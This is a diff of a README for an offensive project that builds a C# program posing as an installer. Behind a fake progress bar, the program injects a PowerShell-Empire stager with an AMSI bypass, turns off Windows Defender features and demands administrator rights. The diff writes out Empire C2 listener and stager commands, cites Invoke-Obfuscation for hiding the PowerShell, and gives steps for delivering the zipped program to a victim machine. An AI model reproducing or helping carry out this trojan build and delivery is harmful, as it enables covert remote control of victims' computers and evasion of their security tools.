@@ -50,25 +50,91 @@
                /_/                         /____/                  
 ```
 
-### Technologies
+## Techno & Tools
 
-- Powershell-empire
+---
+
 - C#
-- Powershell
-- KaliLinux
+- Python
+- PowerShell-Empire
+- https://github.com/danielbohannon/Invoke-Obfuscation
 
-### Steps
+## Process
 
-- Create c# program
-- Feel free to modify my c# program to your needs
-    Here some key points, if you want to adjust it to your needs:
-    - uri of the Invoke-WebRequest
-    - The name of the outfile
-    - the executable program
-- Run command : `dotnet build -o <path> -p:AssemblyName=<name>`
-` (in my case the platform is win-x64)
-- Rename folder and executable name to the preferred name and zip it (in my case the name of my project is extremely suspicious)
-- Find a way to put the zip folder on the victim machine (in my case i will drag and drop it)
-- Execute it
+---
 
-- Enjoy...:)
+## Setup Environment
+
+- You will need 2 VMs
+    - Windows (Victim)
+    - Kali Linux (Attacker)
+
+Configure C2
+
+### 1. Start PowerShell-Empire
+
+<aside>
+📌 Open 2  terminal and in each one enter these command (one in each)
+
+</aside>
+
+```bash
+sudo powershell-empire server
+sudo powershell-empire client
+```
+
+### 2. Configure Listener
+
+```bash
+uselistner http
+set Name <Name>
+set Host <Your IP>
+set Port <Port>
+execute
+```
+
+### 3. Configure Stager
+
+<aside>
+📌 This will generate .bat file
+
+</aside>
+
+```bash
+usestager windows/laucher_bat
+set listener <listener_name>
+execute
+```
+
+## Coding Application
+
+<aside>
+💡 Make Progress Bar that will make it seem, like it is installing something but in the background it will inject the stager + AMSI Bypass (The patch is only applied for one PowerShell session after that it goes back to default)
+
+</aside>
+
+- I added an app-manifest that requires the application to be executed as administrator, so I would already have elevated privilege
+- I also added some PowerShell command to deactivate some functionalities of windows defender, to be able to execute the script (They will be obfuscated)
+- Now Your question might be why you need an AMSI bypass if you will disable windows defender. The thing is when you some PowerShell command AMSI will block it’s execution because it might be a malicious command even if it is obfuscated
+
+## Obfuscation
+
+<aside>
+📌 Follow the instruction in this repository: https://github.com/danielbohannon/Invoke-Obfuscation, to install Invoke-Obfuscation on you attacking machine (Do it in a new terminal)
+
+</aside>
+
+You can encode any PowerShell command that you add in the Agent Process class
+
+## Delivery
+
+```bash
+dotnet build
+```
+
+- Testing
+    - Zip the program
+    - Put it on the victim machine
+    - unzip it
+    - execute program
+        - Will have to keep my listener running on my PowerShell machine
